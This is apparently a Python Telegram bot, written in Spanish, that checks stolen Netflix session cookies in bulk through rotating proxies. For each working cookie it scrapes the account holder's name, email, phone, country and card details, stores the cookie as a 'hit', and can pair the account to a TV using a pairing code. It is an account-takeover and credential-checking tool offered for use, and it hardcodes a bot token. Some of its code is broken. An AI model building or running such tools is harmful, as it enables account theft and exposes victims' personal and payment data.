import os
import re
import time
import random
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import requests
import json

# ==========================================
# CONFIGURACIÓN DE LOGGING
# ==========================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==========================================
# CONFIGURACIÓN PRINCIPAL
# ==========================================
# Usar variable de entorno si existe, sino el valor hardcodeado (por si pruebas local)
TOKEN = os.environ.get('BOT_TOKEN', "9212668286:AAGTuejSRwVAODsY4pRU_gmHVLXb3hL6cqU")
ADMIN_ID = int(os.environ.get('ADMIN_ID', 8917082484))

# Palabras clave para filtrar spam
SPAM_KEYWORDS = ["luckybear", "casino", "bond", "promo", "gift", "bonus"]

# Patrones para detectar códigos de TV (Formatos comunes: XXXX-XXXX, XXX-XXX)
TV_CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}-[A-Z0-9]{4}$|^[A-Z0-9]{3}-[A-Z0-9]{3}$')

# ==========================================
# VARIABLES GLOBALES
# ==========================================
user_sessions = {}  # {chat_id: {'cookies': [], 'waiting_for_cookie': bool, 'tv_code': str}}
stats = {
    'checked': 0,
    'hits': 0,
    'bad': 0,
    'errors': 0,
    'start_time': None,
    'last_check_time': None
}

PROXY_LIST = []

def load_proxies():
    global PROXY_LIST
    try:
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
                PROXY_LIST = [line.strip() for line in lines if line.strip()]
            logger.info(f"Cargados {len(PROXY_LIST)} proxies.")
        else:
            PROXY_LIST = []
    except Exception as e:
        logger.error(f"Error cargando proxies: {e}")
        PROXY_LIST = []

def get_proxy():
    if not PROXY_LIST:
        return None
    return random.choice(PROXY_LIST)

# ==========================================
# LÓGICA DE CONEXIÓN CON TV
# ==========================================
def check_tv_connection(tv_code, cookie):
    """
    Simula la conexión de Netflix en Smart TV usando un código de emparejamiento.
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }

    url = "https://www.netflix.com/nfpa/auth/login"

    payload = {
        "code": tv_code,
        "codeVerificationCode": "",
        "rememberMe": True
    }

    cookies_dict = {}
    for c in cookie.split(';'):
        if '=' in c:
            k, v = c.split('=', 1)
            cookies_dict[k.strip()] = v.strip()

    try:
        response = requests.post(url, json=payload, headers=headers, cookies=cookies_dict, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if 'token' in data or 'sessionToken' in data:
                return True
            elif 'error' in data:
                return False
            else:
                return True
        else:
            return False
    except Exception:
        return False

def extract_cookies_from_message(text):
    """Extrae todas las cookies válidas de un mensaje de texto."""
    cookies = []
    pattern = r'(?:NetflixId|SecureNetflixId)=([^;]+)'
    matches = re.findall(pattern, text)
    for match in matches:
        cookies.append(match)
    return cookies

def is_spam(message_text):
    text_lower = message_text.lower()
    return any(keyword in text_lower for keyword in SPAM_KEYWORDS)

# ==========================================
# HANDLERS DE TELEGRAM
# ==========================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 ¡Bienvenido! Soy el verificador de Netflix con soporte para TV.\n\n"
        "🔹 Envía una cookie para verificarla.\n"
        "🔹 Para conectar TV: Envía el código (ej: ABC-1234) y luego la cookie.\n"
        "🔹 Usa /done para procesar lotes.\n"
        "🔹 Usa /stats para ver estadísticas."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📋 Comandos:\n"
        "/start - Iniciar bot\n"
        "/help - Ayuda\n"
        "/stats - Estadísticas (Admin)\n"
        "/logs - Últimos hits (Admin)\n"
        "/done - Procesar cola actual\n"
        "/cancel - Cancelar cola\n"
        "\n💡 Para TV: Envía el código seguido de la cookie."
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Acceso restringido.")
        return

    total_checked = stats['checked']
    hits = stats['hits']
    bad = stats['bad']
    errors = stats['errors']

    if total_checked > 0:
        hit_rate = (hits / total_checked) * 100
    else:
        hit_rate = 0

    elapsed = ""
    if stats['start_time']:
        now = time.time()
        elapsed = f"{int(now - stats['start_time'])}s"

    msg = f"📊 Estadísticas:\n"
    msg += f"✅ Hits: {hits}\n"
    msg += f"❌ Bad: {bad}\n"
    msg += f"⚠️ Errors: {errors}\n"
    msg += f"🎯 Hit Rate: {hit_rate:.2f}%\n"
    msg += f"⏱️ Tiempo: {elapsed}"

    await update.message.reply_text(msg)

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Acceso restringido.")
        return

    if not os.path.exists('logs/bot.log'):
        await update.message.reply_text("No hay logs disponibles.")
        return

    try:
        with open('logs/bot.log', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            last_5 = lines[-5:] if len(lines) >= 5 else lines

        if not last_5:
            await update.message.reply_text("No hay logs recientes.")
            return

        log_content = "".join(last_5)
        await update.message.reply_text(f"📜 Últimos 5 logs:\n```\n{log_content}\n```", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error leyendo logs: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Spam filter
    if is_spam(text):
        await update.message.delete()
        await update.message.reply_text("🗑️ Mensaje eliminado por spam.", reply_to_message_id=update.message.message_id)
        return

    # Check if waiting for cookie after TV code
    if user_id in user_sessions and user_sessions[user_id].get('waiting_for_cookie'):
        session = user_sessions[user_id]
        tv_code = session.get('tv_code')
        cookie = text # Assume the whole message is the cookie

        # Process TV connection
        await update.message.reply_text(f"⏳ Conectando dispositivo...\nCódigo detectado: {tv_code}\nPor favor, confirma en tu TV.")

        success = check_tv_connection(tv_code, cookie)

        if success:
            keyboard = [
                [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
                 InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
                [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                f"✅ ¡Conexión Exitosa!\nTu cuenta ya está activa en la Smart TV.\n\n"
                f"🍪 Cookie: `{cookie}`",
                reply_markup=reply_markup
            )
            save_hit(cookie, "TV")
            user_sessions[user_id]['waiting_for_cookie'] = False
            user_sessions[user_id]['tv_code'] = None
        else:
            await update.message.reply_text("❌ La conexión falló. Intenta de nuevo.")
            user_sessions[user_id]['waiting_for_cookie'] = False
            user_sessions[user_id]['tv_code'] = None
        return

    # Detect if message contains a TV code
    tv_code_match = TV_CODE_PATTERN.search(text)
    has_tv_code = bool(tv_code_match)
    extracted_cookies = extract_cookies_from_message(text)

    if has_tv_code and not extracted_cookies:
        # User sent only the TV code
        tv_code = tv_code_match.group(0)
        user_sessions[user_id] = {'waiting_for_cookie': True, 'tv_code': tv_code}
        await update.message.reply_text(f"📺 Código detectado: {tv_code}\nAhora, por favor envía la cookie para conectar.")
        return

    # Normal processing: Add to queue or process immediately if single
    if user_id not in user_sessions:
        user_sessions[user_id] = {'cookies': [], 'waiting_for_cookie': False, 'tv_code': None}

    session = user_sessions[user_id]

    # If we are in batch mode (user sends multiple messages), add to queue
    if len(extracted_cookies) > 0:
        session['cookies'].extend(extracted_cookies)
        await update.message.reply_text(f"📦 Cookie almacenada! ({len(session['cookies'])} en fila)")
    else:
        await update.message.reply_text("No se encontraron cookies válidas en el mensaje.")

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions or not user_sessions[user_id]['cookies']:
        await update.message.reply_text("No hay cookies en la cola.")
        return

    cookies = user_sessions[user_id]['cookies']
    user_sessions[user_id]['cookies'] = [] # Clear queue

    await update.message.reply_text(f"🔄 Procesando {len(cookies)} cookies...")

    # Process in threads
    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_single_cookie, c): i for i, c in enumerate(cookies)}
        for future in as_completed(futures):
            result = future.result()
            results.append((futures[future], result))

    # Sort results by original index
    results.sort(key=lambda x: x[0].index)

    for _, result in results:
        if result:
            await update.message.reply_text(result, parse_mode='HTML', disable_web_page_preview=True)

    await update.message.reply_text(f"✅ Proceso completado!")

def check_single_cookie(cookie):
    """Verifica una sola cookie y devuelve el mensaje formateado."""
    global stats
    stats['checked'] += 1

    proxy = get_proxy()
    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }

        cookies_dict = {}
        for c in cookie.split(';'):
            if '=' in c:
                k, v = c.split('=', 1)
                cookies_dict[k.strip()] = v.strip()

        profile_url = "https://www.netflix.com/api/shakti/profiles"
        response = requests.get(profile_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)

        if response.status_code == 200:
            profiles_data = response.json()
            main_profile = None
            for p in profiles_data.get('items', []):
                if p.get('isMainProfile'):
                    main_profile = p
                    break

            if not main_profile:
                main_profile = profiles_data['items'][0] if profiles_data['items'] else None

            if main_profile:
                profile_id = main_profile['id']
                nftoken = cookies_dict.get('nflxToken', '')

                account_url = f"https://www.netflix.com/api/v2/profile/{profile_id}/account"
                account_response = requests.get(account_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)

                if account_response.status_code == 200:
                    account_data = account_response.json()

                    name = account_data.get('subscriberName', 'N/A')
                    email = account_data.get('email', 'N/A')
                    plan_type = account_data.get('currentCycle', {}).get('planDescriptor', {}).get('name', 'N/A')
                    country = account_data.get('billingAddress', {}).get('country', 'N/A')
                    card_brand = account_data.get('paymentInfo', {}).get('cardBrand', 'N/A')
                    card_last_four = account_data.get('paymentInfo', {}).get('lastFourDigits', 'N/A')
                    member_since = account_data.get('memberSinceDate', 'N/A')
                    next_billing_date = account_data.get('nextBillingDate', 'N/A')
                    video_quality = account_data.get('currentCycle', {}).get('features', {}).get('videoQuality', 'N/A')
                    max_streams = account_data.get('currentCycle', {}).get('features', {}).get('maxStreamingDevices', 'N/A')
                    extra_slots = account_data.get('currentCycle', {}).get('features', {}).get('maxProfiles', 'N/A')
                    phone = account_data.get('phoneNumber', 'N/A')
                    verified = account_data.get('phoneNumberVerified', False)

                    try:
                        member_since_dt = datetime.fromtimestamp(member_since / 1000)
                        member_since_str = member_since_dt.strftime("%Y-%m-%d")
                    except:
                        member_since_str = str(member_since)

                    try:
                        next_billing_dt = datetime.fromtimestamp(next_billing_date / 1000)
                        next_billing_str = next_billing_dt.strftime("%Y-%m-%d")
                    except:
                        next_billing_str = str(next_billing_date)

                    msg = f"✅ <b>HIT DETECTADO</b>\n\n"
                    msg += f"👤 <b>Nombre:</b> {name}\n"
                    msg += f"📧 <b>Email:</b> {email}\n"
                    msg += f"🌍 <b>País:</b> {country}\n"
                    msg += f"💎 <b>Plan:</b> {plan_type}\n"
                    msg += f"📅 <b>Miembro desde:</b> {member_since_str}\n"
                    msg += f"💳 <b>Tarjeta:</b> {card_brand} ****{card_last_four}\n"
                    msg += f"📞 <b>Teléfono:</b> {phone} ({'✅ Verificado' if verified else '❌ No verificado'})\n"
                    msg += f"📺 <b>Calidad:</b> {video_quality}\n"
                    msg += f"👥 <b>Perfiles:</b> {extra_slots}\n"
                    msg += f"🚀 <b>Streams máx:</b> {max_streams}\n"
                    msg += f"💰 <b>Próximo pago:</b> {next_billing_str}\n\n"
                    msg += f"🍪 <b>Cookie:</b> `{cookie}`\n"

                    keyboard = [
                        [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
                         InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
                        [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    stats['hits'] += 1
                    save_hit(cookie, name)
                    return msg

                else:
                    stats['bad'] += 1
                    return "❌ Cookie inválida (Error al obtener cuenta)"
            else:
                stats['bad'] += 1
                return "❌ Cookie inválida (No se encontró perfil principal)"
        else:
            stats['bad'] += 1
            return "❌ Cookie inválida (Error de perfil)"

    except Exception as e:
        stats['errors'] += 1
        logger.error(f"Error checking cookie: {e}")
        return f"⚠️ Error: {str(e)}"

def save_hit(cookie, name):
    try:
        os.makedirs('hits', exist_ok=True)
        filename = f"hits/{name.replace('@', '_').replace(' ', '_')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Cookie: {cookie}\n")
            f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception as e:
        logger.error(f"Error saving hit: {e}")

# ==========================================
# MAIN
# ==========================================

def main():
    load_proxies()

    # OBTENER EL PUERTO QUE RENDER ASIGNÓ
    port = int(os.environ.get("PORT", 5000))

    app = ApplicationBuilder().token(TOKEN).build()

    start_handler = CommandHandler('start', start)
    help_handler = CommandHandler('help', help_command)
    stats_handler = CommandHandler('stats', stats_command)
    logs_handler = CommandHandler('logs', logs_command)
    done_handler = CommandHandler('done', done_command)

    # Handler para cancelar cola
    cancel_handler = CommandHandler('cancel', lambda update, context: update.message.reply_text("Cola vaciada.") or setattr(user_sessions.get(update.effective_user.id, {}), 'cookies', []) if update.effective_user.id in user_sessions else None)

    message_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)

    app.add_handler(start_handler)
    app.add_handler(help_handler)
    app.add_handler(stats_handler)
    app.add_handler(logs_handler)
    app.add_handler(done_handler)
    app.add_handler(cancel_handler)
    app.add_handler(message_handler)

    logger.info("Bot starting...")

    # USAR POLLING EN LUGAR DE WEBHOOK
    # Esto asegura que el bot responda inmediatamente sin problemas de URL o certificados
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
